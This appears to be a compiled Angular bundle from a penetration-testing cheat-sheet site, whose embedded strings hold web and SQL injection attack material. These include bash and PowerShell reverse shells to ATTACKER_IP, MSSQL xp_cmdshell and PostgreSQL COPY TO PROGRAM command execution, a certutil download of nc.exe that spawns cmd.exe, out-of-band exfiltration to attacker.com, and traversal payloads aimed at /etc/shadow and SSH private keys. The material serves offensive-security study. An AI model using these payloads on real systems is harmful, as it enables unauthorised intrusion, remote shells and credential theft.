http://TARGET/shell.php?cmd=bash -c 'bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1'


# ==========================================
# POSTGRESQL
# ==========================================

# Command execution
COPY (SELECT '') TO PROGRAM 'id';

# Reverse shell
COPY (SELECT '') TO PROGRAM
'bash -c "bash -i >& /dev/tcp/ATTACKER_IP/4444 0>&1"';


# ==========================================
# WINDOWS - MSSQL
# ==========================================

# Command execution
EXEC xp_cmdshell 'whoami';

EXEC xp_cmdshell 'ipconfig';

EXEC xp_cmdshell 'net user';

# Enable xp_cmdshell if required
EXEC sp_configure 'show advanced options',1;
RECONFIGURE;

EXEC sp_configure 'xp_cmdshell',1;
RECONFIGURE;


# ==========================================
# POWERSHELL
# ==========================================

# Listener
nc -lvnp 4444

# PowerShell reverse shell
EXEC xp_cmdshell 'powershell -NoP -NonI -W Hidden -Exec Bypass -Command
$client = New-Object System.Net.Sockets.TCPClient("ATTACKER_IP",4444);
$stream = $client.GetStream();
[byte[]]$bytes = 0..65535|%{0};
while(($i = $stream.Read($bytes,0,$bytes.Length)) -ne 0){
$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);
$sendback = (iex $data 2>&1 | Out-String );
$sendback2 = $sendback + "PS " + (pwd).Path + "> ";
$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);
$stream.Write($sendbyte,0,$sendbyte.Length);
$stream.Flush()
}';


# ==========================================
# FILE DOWNLOAD
# ==========================================

# Download payload using certutil
EXEC xp_cmdshell 'certutil -urlcache -split -f
http://ATTACKER_IP/nc.exe C:WindowsTemp
c.exe';


# Spawn netcat shell
EXEC xp_cmdshell 'C:WindowsTemp
c.exe ATTACKER_IP 4444 -e cmd.exe';


# ==========================================
# ATTACK CHAIN
# ==========================================

SQLi
\u2192 File Read
\u2192 File Write
\u2192 Web Shell
\u2192 Command Execution
\u2192 Reverse Shell
\u2192 Privilege Escalation
`;sqliOob=`
# Out-of-Band (OOB) SQL Injection

# Used when no direct output is visible.

# MySQL file/DNS-style request
SELECT LOAD_FILE(CONCAT('\\\\attacker.com\\', database()));

# OOB techniques can use:
# - DNS exfiltration
# - HTTP requests
# - External callbacks
`;sqliFlow=`
# SQL Injection - Practical Exploitation Flow

# 1. Detect injection point
'
"
boolean change

# 2. Identify SQLi type
Error-based
Union-based
Blind
Time-based
Stacked

# 3. Determine number of columns
' ORDER BY 1--
' ORDER BY 2--
' ORDER BY 3--

# 4. Extract DB information
database()
user()
@@version()

# 5. Enumerate schema
information_schema.tables
information_schema.columns

# 6. Enumerate users / privileges

# 7. Test file read / file write

# 8. Test command execution

# 9. Obtain shell if possible

# 10. Continue with privilege escalation
`;sqliNotes=`
# SQL Injection - Important Notes

# Always confirm the injection type before testing large payloads.

# Blind SQLi is common in modern applications.

# WAF bypass requires adapting the payload to the filter.

# Identify the DBMS before using DB-specific syntax.

# Common DBMS
MySQL / MariaDB
MSSQL
PostgreSQL

# RCE depends heavily on database privileges.

# MySQL FILE privilege can be critical.

# xp_cmdshell may be disabled in MSSQL.

# SQLi does not automatically mean RCE.

# Typical attack chain
SQLi
\u2192 Enumeration
\u2192 Data Extraction
\u2192 File Read / Write
\u2192 Command Execution
\u2192 Shell
\u2192 Privilege Escalation
`;fileInclusionWorkflow=`
# File Inclusion Workflow

# 1. Identify potentially vulnerable parameters
page=
file=
path=
include=
template=
lang=

# 2. Confirm LFI
../../../../etc/passwd

# 3. Try Windows files
../../../../boot.ini
../../../../Windows/System32/drivers/etc/hosts

# 4. Attempt source disclosure
php://filter/convert.base64-encode/resource=index.php

# 5. Look for useful files
/etc/passwd
/etc/shadow
/var/log/apache2/access.log
/var/www/html/config.php

# 6. Test log poisoning

# 7. Test PHP wrappers

# 8. If remote inclusion is possible, test RFI

# 9. Escalate to code execution where applicable
`;directoryTraversal=`
# ==========================================
# BASIC DIRECTORY TRAVERSAL
# ==========================================

# Linux - /etc/passwd
http://<IP>/index.php?page=../../../../etc/passwd

# Windows - hosts
http://<IP>/index.php?page=../../../../../../Windows/System32/drivers/etc/hosts

# SSH private key
http://<IP>/index.php?page=../../../../home/<user>/.ssh/id_rsa


# ==========================================
# PARAMETER ENUMERATION
# ==========================================

# Common vulnerable parameters
page=
file=
path=
doc=
folder=
include=
lang=
template=

# Example
http://<IP>/index.php?page=about.html

# Test traversal
http://<IP>/index.php?page=../../../../etc/passwd


# ==========================================
# TRAVERSAL PAYLOADS
# ==========================================

# Basic
../../../../etc/passwd

# Deep traversal
../../../../../../../../etc/passwd

# Windows
..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts

# Null byte - legacy systems
../../../../etc/passwd%00


# ==========================================
# FILTER BYPASS
# ==========================================

# URL encoding
%2e%2e%2f%2e%2e%2fetc/passwd

# Double encoding
%252e%252e%252f

# Backslashes - Windows
..\\..\\..\\..\\Windows\\System32\\drivers\\etc\\hosts

# Mixed encoding
%2e%2e/\\%2e%2e/\\etc/passwd

# Dot obfuscation
....//....//....//etc/passwd

# Alternative dot obfuscation
....\\/....\\/....\\/etc/passwd

# Mixed traversal
..../..../..../..../etc/passwd

# Mixed traversal with current directory
../.././../.././etc/passwd

# Redundant slashes
../../../../etc//passwd

# Current directory
../../../../etc/./passwd


# ==========================================
# USEFUL LINUX FILES
# ==========================================

/etc/passwd
/etc/shadow
/home/<user>/.ssh/id_rsa
/var/log/auth.log
/var/www/html/config.php


# ==========================================
# USEFUL WINDOWS FILES
# ==========================================

C:\\Windows\\System32\\drivers\\etc\\hosts
C:\\inetpub\\wwwroot\\web.config
C:\\inetpub\\logs\\LogFiles\\W3SVC1\\


# ==========================================
# QUICK TESTING
# ==========================================

# curl
curl "http://<IP>/index.php?page=../../../../etc/passwd"

# Burp Suite
# Intercept request -> modify parameter -> send payload


# ==========================================
# NOTES
# ==========================================

# Try different traversal depths.
# Test both encoded and unencoded payloads.
# Check for ../ filtering.
# Test both / and \\ on Windows targets.
# Combine with LFI / file inclusion when applicable.
`;webDirectories=`
ffuf -u http://<IP>/FUZZ -w /usr/share/seclists/Discovery/Web-Content/common.txt

gobuster dir -u http://<IP> \\
-w /usr/share/wordlists/dirb/common.txt

feroxbuster -u http://<IP>
  `;webFiles=`
ffuf -u http://<IP>/FUZZ \\
-w /usr/share/seclists/Discovery/Web-Content/common.txt \\
-e .php,.html,.txt,.bak,.zip,.old
  `;webVhosts=`
ffuf -u http://<IP> \\
-H "Host: FUZZ.<DOMAIN>" \\
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

gobuster vhost -u http://<IP> \\
-w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt
  `;webAuthentication=`
curl -i http://<IP>/login

# Inspect:
# - Login parameters
# - Error messages
# - Username enumeration
# - Rate limiting
# - Authentication tokens
  `;webSessions=`
curl -I http://<IP>/login

# Inspect:
# - Set-Cookie
# - Session identifiers
# - Secure
# - HttpOnly
# - SameSite
  `;webParameters=`
ffuf -u "http://<IP>/page.php?FUZZ=test" \\
-w /usr/share/seclists/Discovery/Web-Content/burp-parameter-names.txt

arjun -u http://<IP>/page.php
  `;sqlInjection=`
sqlmap -u "http://<IP>/page.php?id=1" --batch

sqlmap -u "http://<IP>/page.php?id=1" \\
--dbs --batch
  `;commandInjection=`
# Identify parameters that may execute system commands.

; id
| id
&& id
|| id
\`id\`
$(id)
  `;reflectedXss=`
<script>alert(1)<\/script>

"><script>alert(1)<\/script>

"><img src=x onerror=alert(1)>
  `;storedXss=`
# Identify persistent input fields:

- Comments
- Profiles
- Messages
- Tickets
- Usernames

Test whether supplied HTML/JavaScript is stored
and executed when the value is viewed.
  `;domXss=`
# Inspect JavaScript sinks:

innerHTML
outerHTML
document.write()
eval()
setTimeout()
location

# Trace user-controlled input into dangerous sinks.
  `;fileUpload=`
# Test:

- Extension validation
- MIME type validation
- Content validation
- Filename manipulation
- Double extensions
- Path traversal
- Server-side processing

Example:

file.php.jpg
file.phtml
file.php%00.jpg
  `;lfi=`
# Common parameters:

?page=
?file=
?path=
?include=
?template=
?document=

Example:

http://<IP>/index.php?page=../../../../etc/passwd
  `;ssrf=`
# Test server-side URL parameters:

?url=
?uri=
?path=
?dest=
?redirect=
?link=

Example:

http://127.0.0.1
http://localhost
  `;apiDiscovery=`
ffuf -u http://<IP>/FUZZ \\
-w /usr/share/seclists/Discovery/Web-Content/common.txt

# Look for:

/api
/api/v1
/api/v2
/swagger
/swagger.json
/openapi.json
/graphql
  `;apiTesting=`
# Test:

- Authentication
- Authorization
- IDOR
- HTTP methods
- Hidden parameters
- Rate limiting
- Input validation

curl -i http://<IP>/api/v1/users
  `;static \u0275fac=function(i){return new(i||o)};static \u0275cmp=b({type:o,selectors:[["app-common-services"]],decls:12,vars:2,consts:[[1,"web-page"],[1,"page-header"],[1,"terminal-path"],[1,"prompt"],[1,"title"],[1,"page-description"],[4,"ngIf"],["class","detail",4,"ngIf"],[1,"web-section"],[1,"section-header"],[1,"section-line"],[1,"grid"],[1,"card",3,"click"],[1,"card-icon"],[1,"card-content"],[1,"detail"],[1,"back",3,"click"],[1,"section-description"],[3,"command"]],template:function(i,m){i&1&&(t(0,"div",0)(1,"div",1)(2,"div",2)(3,"span",3),n(4,"~/get.sh/"),e(),n(5,"web"),e(),t(6,"h1",4),n(7,"Web"),e(),t(8,"p",5),n(9," Web application reconnaissance, enumeration and common attack techniques. "),e()(),S(10,C,116,0,"div",6)(11,A,13,10,"div",7),e()),i&2&&(a(10),s("ngIf",!m.selectedWebSection),a(),s("ngIf",m.selectedWebSection))},dependencies:[w,I,y,E,v,T,P],styles:[".web-page[_ngcontent-%COMP%]{padding:2rem;color:#e2e8f0}.page-header[_ngcontent-%COMP%]{margin-bottom:2rem}.terminal-path[_ngcontent-%COMP%]{font-family:JetBrains Mono,monospace;font-size:13px;color:#64748b;margin-bottom:.75rem}.terminal-path[_ngcontent-%COMP%]   .prompt[_ngcontent-%COMP%]{color:#7cff00}.title[_ngcontent-%COMP%]{margin:0;font-size:28px;font-weight:600;color:#f8fafc}.page-description[_ngcontent-%COMP%]{margin-top:.5rem;max-width:750px;color:#94a3b8;font-size:14px;line-height:1.6}.grid[_ngcontent-%COMP%]{display:grid;grid-template-columns:repeat(auto-fit,minmax(250px,1fr));gap:1rem}.card[_ngcontent-%COMP%]{display:flex;align-items:flex-start;gap:1rem;padding:1.25rem;background:#0b1220;border:1px solid #1e293b;border-radius:8px;cursor:pointer;transition:transform .2s ease,border-color .2s ease,background .2s ease}.card[_ngcontent-%COMP%]:hover{transform:translateY(-2px);background:#111827;border-color:#334155}.card-icon[_ngcontent-%COMP%]{min-width:38px;height:38px;display:flex;align-items:center;justify-content:center;border:1px solid #1e293b;border-radius:6px;background:#0f172a;color:#7cff00;font-family:JetBrains Mono,monospace;font-size:16px}.card-content[_ngcontent-%COMP%]{min-width:0}.card[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0 0 .4rem;font-size:16px;font-weight:500;color:#f8fafc}.card[_ngcontent-%COMP%]   p[_ngcontent-%COMP%]{margin:0;color:#64748b;font-size:13px;line-height:1.5}.detail[_ngcontent-%COMP%]{max-width:1000px}.web-section[_ngcontent-%COMP%]{margin-bottom:3rem}.section-header[_ngcontent-%COMP%]{display:flex;align-items:center;width:100%;margin-bottom:1rem}.section-header[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0 14px;color:#64748b;font-family:JetBrains Mono,monospace;font-size:11px;font-weight:500;letter-spacing:1.5px;line-height:1;white-space:nowrap}.section-line[_ngcontent-%COMP%]{flex:1;height:1px;background:#1e293b}.back[_ngcontent-%COMP%]{margin-bottom:1.5rem;padding:8px 12px;background:transparent;border:1px solid #1e293b;border-radius:6px;color:#94a3b8;font-family:JetBrains Mono,monospace;font-size:12px;cursor:pointer;transition:.2s}.back[_ngcontent-%COMP%]:hover{background:#1e293b;color:#fff}.detail[_ngcontent-%COMP%]   h2[_ngcontent-%COMP%]{margin:0 0 .75rem;color:#f8fafc;font-size:22px;font-weight:600}.section-description[_ngcontent-%COMP%]{margin-bottom:1.5rem;max-width:800px;color:#94a3b8;font-size:14px;line-height:1.6}mat-expansion-panel[_ngcontent-%COMP%]{margin-bottom:10px;background:#0b1220!important;border:1px solid #1e293b;border-radius:6px!important;box-shadow:none!important}mat-expansion-panel[_ngcontent-%COMP%]:hover{border-color:#334155}mat-panel-title[_ngcontent-%COMP%]{color:#cbd5e1!important;font-family:JetBrains Mono,monospace;font-size:13px}mat-expansion-panel-header[_ngcontent-%COMP%]{height:52px}mat-expansion-panel-header[_ngcontent-%COMP%]:hover{background:#111827!important}code[_ngcontent-%COMP%]{padding:2px 5px;background:#111827;border:1px solid #1e293b;border-radius:4px;color:#7cff00;font-family:JetBrains Mono,monospace;font-size:12px}@media(max-width:768px){.web-page[_ngcontent-%COMP%]{padding:1rem}.grid[_ngcontent-%COMP%]{grid-template-columns:1fr}.title[_ngcontent-%COMP%]{font-size:24px}}"]})};export{_ as Web};
